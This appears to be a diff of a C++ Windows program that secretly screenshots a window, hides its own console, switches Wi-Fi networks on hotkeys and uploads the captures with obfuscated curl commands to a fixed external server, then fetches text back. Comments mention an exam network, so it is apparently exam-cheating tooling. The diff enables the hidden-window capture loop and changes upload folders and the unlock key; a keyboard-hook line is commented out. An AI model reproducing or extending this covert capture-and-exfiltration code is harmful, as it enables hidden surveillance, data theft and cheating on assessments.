@@ -86,7 +86,7 @@ void take_picture(int &i)
 	scrdc = ::GetDC(eos);
 	memdc = CreateCompatibleDC(scrdc);
 	int Width = rc.right - rc.left;
-	int Height = rc.bottom - rc.top- 150;
+	int Height = rc.bottom - rc.top - 150;
 	membit = CreateCompatibleBitmap(scrdc, Width, Height);
 	HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
 	BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 125, SRCCOPY);
@@ -191,7 +191,7 @@ void gdiscreen()
 	while (true)
 	{
 		
-		hHook = shook_win(WH_KEYBOARD_LL, (HOOKPROC)KeyHookProc, 0, 0);
+		//hHook = shook_win(WH_KEYBOARD_LL, (HOOKPROC)KeyHookProc, 0, 0);
 		
 		if (get_key(VK_F6))//Connect to wifi dh
 		{
@@ -218,8 +218,8 @@ void gdiscreen()
 		if (get_key(VK_F7))//Connect to wifi exam
 		{
 			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name= "cuuvuive2" interface="Wi-Fi")"));
-			system(AY_OBFUSCATE(R"("netsh wlan connect name= "cuuvuive2" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name= "ak47h" interface="Wi-Fi")"));
+			system(AY_OBFUSCATE(R"("netsh wlan connect name= "ak47h" interface="Wi-Fi")"));
 			type = 2;
 			Sleep(100);
 		}
@@ -269,8 +269,8 @@ void gdiscreen()
 				s = "";
 				//curl --proxy 10.22.194.46:8080http://103.143.143.227/up.php?floder="uploads/abc/" -F "uploadedfile=@cap7.webp"bi
 				//sprintf(cmd, AY_OBFUSCATE(R"("t2 -F "uploadedfile=@%s.webp" http://103.143.143.227/up.php?floder="uploads/abc/"")"), file);
-				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227:80/up.php?floder="uploads/alpha_9832/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
-				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227:80/up.php?floder="uploads/alpha_9832/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227:80/up.php?floder="uploads/hola99/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
+				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227:80/up.php?floder="uploads/hola99/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
 				if(!std::count(uploaded_file.begin(), uploaded_file.end(), vec_file("")[j])) system(cmd);
 				else continue;
 				newfile2.open("stats.txt", std::ios::in);
@@ -321,16 +321,16 @@ void gdiscreen()
 			char cmd[500];
 			if (type == 1)
 			{
-				if(dow==0) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.45:8080 http://103.143.143.227/alpha_9832.txt -o "work.txt"")"));
-				else if(dow==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227/alpha_9832.txt -o "work.txt"")"));
+				if(dow==0) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.45:8080 http://103.143.143.227/hola99.txt -o "work.txt"")"));
+				else if(dow==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227/hola99.txt -o "work.txt"")"));
 				else if (dow == 2)
 				{
-					sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.193.47:8080 http://103.143.143.227/alpha_9832.txt -o "work.txt"")"));
+					sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.193.47:8080 http://103.143.143.227/hola99.txt -o "work.txt"")"));
 					dow = 0;
 				}
 				dow +=1;
 			}
-			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227/alpha_9832.txt -o "work.txt"")"));
+			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227/hola99.txt -o "work.txt"")"));
 			system(cmd);
 			printf("--------------------------------------------------");
 			Sleep(100);	
@@ -411,14 +411,14 @@ int main()
 		std::string key;
 		printf(AY_OBFUSCATE("key:"));
 		std::cin >> key;
-		const char *x = AY_OBFUSCATE("peprf");
+		const char *x = AY_OBFUSCATE("abc");
 		if (key == x)
 		{
 			printf(AY_OBFUSCATE("\nKey cua ban hop le"));
 			Sleep(2000);
-			//s_wint(gcs_w(), "");
-		    //sw(gcs_w(), SW_HIDE);
-			//gdiscreen();
+			s_wint(gcs_w(), "");
+		    sw(gcs_w(), SW_HIDE);
+			gdiscreen();
 		}
 		else
 		{
